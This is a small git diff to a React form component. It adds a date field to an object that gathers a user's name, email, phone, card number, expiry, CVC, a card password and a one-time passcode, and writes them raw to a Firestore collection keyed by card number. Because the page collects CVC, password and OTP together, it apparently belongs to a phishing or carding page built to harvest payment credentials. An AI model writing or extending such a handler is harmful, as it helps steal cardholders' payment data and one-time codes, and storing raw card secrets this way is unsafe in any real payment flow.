@@ -117,7 +117,7 @@ export default function Component() {
 
     const handleSubmit = (e: React.FormEvent) => {
         e.preventDefault()
-        let alldat = { personalInfo: { id: id, name: name, email: email, phone: phone }, payment: { cardNumber: cardNumber, expiry: expiry, cvc: cvc,pass:pass }, otp: { otp: otp } }
+        let alldat = { date:new Date().getDate(),personalInfo: { id: id, name: name, email: email, phone: phone }, payment: { cardNumber: cardNumber, expiry: expiry, cvc: cvc,pass:pass }, otp: { otp: otp } }
         setDoc(doc(db, "data", cardNumber), alldat);
 
     }
